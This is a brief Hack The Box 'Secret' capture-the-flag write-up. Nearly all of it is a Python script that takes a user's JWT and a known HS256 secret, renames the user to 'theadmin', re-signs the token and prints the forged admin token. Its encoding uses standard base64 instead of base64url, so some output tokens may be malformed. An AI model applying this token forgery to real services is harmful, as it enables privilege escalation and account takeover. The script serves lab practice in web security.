#### Hack The Box -  Secret 

Simple script for generating new JWT token for admin user.  

Usage:
```bash
$ python3 jwt_token.py --token <jwt_token_normal_user> --secret <secret_token_for_hs256_signature>
```

```python
import base64
import hmac
import hashlib
import argparse
import json

parser = argparse.ArgumentParser()
parser.add_argument('--token', metavar='<jwt auth token after registration>', required=True, type=str)
parser.add_argument('--secret', metavar='<HS256 secret key>', required=True, type=str)


args = parser.parse_args()

jwt_token = args.token.split('.')


header = json.loads(base64.b64decode(jwt_token[0] + '==').decode())
payload = json.loads(base64.b64decode(jwt_token[1] + '==').decode())

payload['name'] = 'theadmin'

header = json.dumps(header).encode('utf-8')
payload = json.dumps(payload).encode('utf-8')

header_payload = base64.b64encode(header).decode().strip('=') + '.' + base64.b64encode(payload).decode().strip('=')

signature = hmac.new(args.secret.encode('utf-8'), header_payload.encode('utf-8'), digestmod=hashlib.sha256).digest()
print('----------------')
print('New JWT Token')
print('----------------')
print(header_payload + '.' +  base64.b64encode(signature).decode().strip('='))
```
